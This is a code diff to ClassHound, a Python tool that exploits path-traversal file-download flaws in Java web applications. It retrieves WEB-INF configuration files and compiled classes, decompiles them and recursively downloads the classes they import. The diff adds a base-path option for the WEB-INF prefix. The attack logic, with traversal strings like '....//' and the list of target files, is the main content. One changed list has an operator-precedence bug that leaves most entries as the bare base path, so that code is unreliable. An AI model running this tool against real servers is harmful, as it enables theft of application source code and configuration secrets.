@@ -55,13 +55,16 @@ def change_travel_path(travel_file_path):
 
 
 def save_file(save_dir, file_name, content):
-    file_name = file_name.replace('\\', '/').lstrip('/')
-    dirs = file_name.split('/')[:-1]
-    cur_dir = os.path.join(save_dir, "/".join(dirs))
-    if not os.path.exists(cur_dir):
-        os.makedirs(cur_dir)
-    with open(os.path.join(cur_dir, file_name.split('/')[-1]), 'wb') as f:
-        f.write(content)
+    # if file content is mess, you can play with it
+    # content = content[4:-4]
+    if content:
+        file_name = file_name.replace('\\', '/').lstrip('/')
+        dirs = file_name.split('/')[:-1]
+        cur_dir = os.path.join(save_dir, "/".join(dirs))
+        if not os.path.exists(cur_dir):
+            os.makedirs(cur_dir)
+        with open(os.path.join(cur_dir, file_name.split('/')[-1]), 'wb') as f:
+            f.write(content)
 
 
 def walk_file_paths(directory):
@@ -122,7 +125,7 @@ def decompile_and_download_class(class_path):
     match = re.findall('import (.*?);', stdout.decode('utf-8'), re.I | re.M | re.S)
     if match:
         for m in match:
-            _class_url_path = '/WEB-INF/classes/' + m.strip().replace(".", "/") + '.class'
+            _class_url_path = base_path + 'WEB-INF/classes/' + m.strip().replace(".", "/") + '.class'
             _allow_download = True
             for x in do_not_download_classes:
                 if x in _class_url_path:
@@ -161,8 +164,8 @@ def parse_xml_get_xml_url(xml_path):
             for servlet_param in servlet.find_all('init-param'):
                 param_value = servlet_param.find('param-value')
                 if not param_value:
-                    xml_urls.append('/WEB-INF/{}-servlet.xml'.format(servlet_name))
-                    xml_urls.append('/WEB-INF/classes/{}-servlet.xml'.format(servlet_name))
+                    xml_urls.append(base_path + 'WEB-INF/{}-servlet.xml'.format(servlet_name))
+                    xml_urls.append(base_path + 'WEB-INF/classes/{}-servlet.xml'.format(servlet_name))
                 else:
                     values.extend(file_path_extract(param_value.text))
         # 模糊正则匹配其他情况
@@ -209,7 +212,7 @@ if __name__ == '__main__':
                   ,,,,,     o' \,=./ `o    |.===.    
                  /(o o)\       (o o)       {}o o{}   
               ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo        
-                                                            ClassHound v0.3\n
+                                                            ClassHound v0.4\n
 ''')
     try:
         current_dir = os.path.dirname(os.path.join(os.path.abspath(sys.argv[0]))).encode('utf-8').decode()
@@ -218,7 +221,7 @@ if __name__ == '__main__':
             current_dir = os.path.dirname(os.path.abspath(sys.argv[0])).decode('utf-8')
         except UnicodeError:
             current_dir = "."
-            exit('[*] Please apply this script in ascii path')
+            exit('[*] Please play this script in ascii path')
 
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
@@ -232,6 +235,7 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--post', dest='raw_post_data', default='', help='POST data, file path must surrounded with delimiter char')
     parser.add_argument('-f', '--file', dest='url_file', default='', help='specify need download file url path list')
     parser.add_argument('-a', '--auto', dest='auto_change', default=False, action='store_true', help='auto detect and change travel char count when use -f options')
+    parser.add_argument('-bp', '--base-path', dest='base_path', default='/', help='/WEB-INF folder prefix web path, default: "/".\nSuch as: change it to "opt/tomcat/webapps/"')
     parser.add_argument('-tc', '--travel-char', dest='travel_char', default='', help='specify travel char like ../')
     parser.add_argument('-cc', '--char-count', dest='travel_char_count', default=0, type=int, help='travel char count number')
     parser.add_argument('-dc', '--delimiter-char', dest='delimiter_char', default='#', help='Delimiter char that surround file path , default: #')
@@ -249,6 +253,7 @@ if __name__ == '__main__':
     max_count = args.max_count
     http_proxy = args.http_proxy
     download_path = args.url_file
+    base_path = args.base_path
     travel_char = args.travel_char
     http_header = args.http_header
     delimiter = args.delimiter_char
@@ -379,10 +384,10 @@ if __name__ == '__main__':
                 travel_char = '....//'
 
     init_travel_files = [
-        'WEB-INF/web.xml',
-        'WEB-INF/struts-config.xml',
-        'WEB-INF/applicationContext.xml',
-        'WEB-INF/classes/applicationContext.xml',
+        base_path if base_path != "/" else "" + 'WEB-INF/web.xml',
+        base_path if base_path != "/" else "" + 'WEB-INF/struts-config.xml',
+        base_path if base_path != "/" else "" + 'WEB-INF/applicationContext.xml',
+        base_path if base_path != "/" else "" + 'WEB-INF/classes/applicationContext.xml',
     ]
     for travel_file in init_travel_files:
         for x in range(1, max_count):
@@ -439,7 +444,7 @@ if __name__ == '__main__':
                     if m:
                         for _m in m:
                             p = _m[0] if _m[0] else (_m[1] if _m[1] else _m[2])
-                            class_url_path = '/WEB-INF/classes/' + p.replace(".", "/").strip() + '.class'
+                            class_url_path = base_path + 'WEB-INF/classes/' + p.replace(".", "/").strip() + '.class'
                             allow_download = True
                             for x in do_not_download_classes:
                                 if x in class_url_path:
